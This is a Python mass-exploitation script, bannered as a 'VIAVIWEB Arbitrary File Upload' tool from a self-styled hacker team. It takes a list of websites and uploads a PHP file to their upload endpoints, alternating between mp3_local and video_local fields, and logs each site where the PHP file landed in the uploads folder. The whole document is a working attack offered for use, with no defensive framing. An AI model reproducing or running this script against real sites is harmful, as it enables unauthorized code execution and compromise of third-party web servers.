import requests
import urllib3
import re

urllib3.disable_warnings()

print("\033[1;36m")
print("======================================================")
print("     [Mass] VIAVIWEB Arbitrary File Upload            ")
print("                                                      ")
print("                                  D704T hengker team  ")
print("                         https://github.com/MantodKaz ")
print("======================================================")
print("\033[0m")

TARGET_FILE = input("List URL: ").strip()

try:
    with open(TARGET_FILE, 'r') as file:
        URLS = [line.strip() for line in file.readlines()]
except FileNotFoundError:
    print("\033[31m" + f"File '{TARGET_FILE}' tidak ditemukan." + "\033[0m")
    exit(1)

MP3_LOCAL_PATH = "error_log.php"
VIDEO_LOCAL_PATH = "error_log.php"

for TARGET_URL in URLS:
    # Add 'http://' if the URL doesn't start with it or 'https://'
    if not TARGET_URL.startswith(('http://', 'https://')):
        if TARGET_URL.startswith('www.'):
            TARGET_URL = f'http://{TARGET_URL}'
        else:
            TARGET_URL = f'https://{TARGET_URL}'

    TARGET_URL = TARGET_URL.rstrip('/')
    TARGET_URL_UPLOAD = f"{TARGET_URL}/uploadscript.php"
    TARGET_URL_MP3_UPLOAD = f"{TARGET_URL}/uploadscript_mp3.php"

    try:
        # upload using mp3_local
        files = {'mp3_local': (MP3_LOCAL_PATH, open(MP3_LOCAL_PATH, 'rb'))}
        response = requests.post(TARGET_URL_UPLOAD, files=files, verify=False)

        if response.status_code == 404:
            # If uploadscript.php not found, try uploadscript_mp3.php with mp3_local
            print("\033[33m" + f"[2nd mp3] {TARGET_URL} trying..." + "\033[0m")
            files = {'mp3_local': (MP3_LOCAL_PATH, open(MP3_LOCAL_PATH, 'rb'))}
            response = requests.post(TARGET_URL_MP3_UPLOAD, files=files, verify=False)

        elif "failed" in response.text.lower():
            # If upload using mp3_local failed, try video_local
            files = {'video_local': (VIDEO_LOCAL_PATH, open(VIDEO_LOCAL_PATH, 'rb'))}
            response = requests.post(TARGET_URL_UPLOAD, files=files, verify=False)

        if "error_log.php" in response.text:
            print(f"\033[32m[Vuln!!] {TARGET_URL} -> ({response.text})\033[0m")
            with open('result.txt', 'a') as result_file:
                result_file.write(f"{TARGET_URL}/uploads/{response.text}\n")

        if re.search(r"\d+_\d+\.php", response.text):
            print(f"\033[32m[Vuln!!] {TARGET_URL} -> ({response.text})\033[0m")
            matched_result = re.search(r"\d+_\d+\.php", response.text)
            file_path = f"{TARGET_URL}/uploads/{matched_result.group()}"
            with open('result.txt', 'a') as result_file:
                result_file.write(file_path + "\n")
    except requests.exceptions.RequestException as e:
        print("\033[31m" + f"[BAD] {TARGET_URL}" + "\033[0m")
        continue  # Skip to the next URL if there's an exception
